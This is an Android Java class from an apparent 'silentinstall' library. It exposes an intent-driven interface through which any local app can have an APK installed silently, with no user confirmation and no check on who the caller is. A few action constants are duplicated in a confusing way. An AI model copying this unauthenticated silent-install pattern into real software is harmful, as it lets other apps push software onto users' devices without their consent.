package com.invisible.silentinstall.core;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.invisible.silentinstall.utils.GlobalContext;
import com.invisible.silentinstall.utils.Util_AndroidOS;
import com.invisible.silentinstall.utils.Util_Process;

import org.json.JSONObject;

import java.io.File;

/**
 * 提供给本地第三方包的静默接口
 */
public class BisCtrl {
    private static final String TAG = "BisCtrl";

    private static BisCtrl bisCtrl = new BisCtrl();

    private static final String ACTION_LTSTAT = "android.intent.action.ltstat"; // 统计Action
    private static final String ACTION_SERVICE = "android.intent.action.fixed"; // MyService Action

    private static final String ACTION_KEY_NAME = "android.intent.install.key"; // MyService Action
    private static final String ACTION_CHECK = "android.intent.action.bsi.check"; // 检查是否能静默Action
    private static final String ACTION_CHECK_RESULT = "android.intent.action.bsi.check"; // 检查是否能静默Action
    private static final String ACTION_INSTALL = "android.intent.action.bsi.install.result"; // 调用静默Action
    private static final String ACTION_INSTALL_RESULT = "android.intent.action.bsi.install.result"; // 调用静默Action

    private BisCtrl() {

    }

    public static BisCtrl getInstance() {
        return bisCtrl;
    }

    public void execute(final Context ctx, final Intent intent) {
        Log.e(TAG, "execute " + intent);
        GlobalContext.init(ctx);
        if (!Util_AndroidOS.checkSilenceInstallPermission(GlobalContext.getCtx())) {
            return;
        }
        try {
            Bundle bundle = intent.getExtras();
            String action = bundle.getString(BisCtrl.ACTION_KEY_NAME);
            if (ACTION_CHECK.equals(action)) {
                JSONObject json = new JSONObject(bundle.getString(ACTION_CHECK));
                bundle = new Bundle();
                bundle.putBoolean("success", true);
                Util_AndroidOS.sendBroadcast(ctx, json.getString("srcPackage"), ACTION_CHECK_RESULT, bundle);
            } else if (ACTION_INSTALL.equals(action)) {
                checkAndInstall(ctx, intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void checkAndInstall(final Context ctx, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            JSONObject json = new JSONObject(bundle.getString(ACTION_INSTALL));
            bundle = new Bundle();
            bundle.putBoolean("success", false);
            String srcPkg = json.getString("srcPackage");
            File file = new File(json.getString("apkPath"));
            if (!file.exists() || !file.isFile()) {
                bundle.putString("error", "APK file is not exists.");
                Util_AndroidOS.sendBroadcast(ctx, srcPkg, ACTION_INSTALL_RESULT, bundle);
                return;
            }
            String ret = Util_Process.installApkSilent(new File(json.getString("apkPath")), " -r ");
            if ("success".equals(ret)) {
                bundle.putBoolean("success", true);
                Util_AndroidOS.sendBroadcast(ctx, srcPkg, ACTION_INSTALL_RESULT, bundle);
            } else {
                // 尝试安装到SD卡
                ret = Util_Process.installApkSilent(new File(json.getString("apkPath")), " -r -s ");
                if ("success".equals(ret)) {
                    bundle.putBoolean("success", true);
                    Util_AndroidOS.sendBroadcast(ctx, srcPkg, ACTION_INSTALL_RESULT, bundle);
                } else {
                    bundle.putString("error", "ERROR: " + ret);
                    Util_AndroidOS.sendBroadcast(ctx, srcPkg, ACTION_INSTALL_RESULT, bundle);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static boolean check(Intent intent) {
        Log.e(TAG, "check " + intent);
        Bundle bundle = null;
        if (intent != null && (bundle = intent.getExtras()) != null) {
            String action = bundle.getString(BisCtrl.ACTION_KEY_NAME);
            if (ACTION_CHECK.equals(action) || ACTION_INSTALL.equals(action)) {
                return true;
            }
        }
        return false;
    }
}

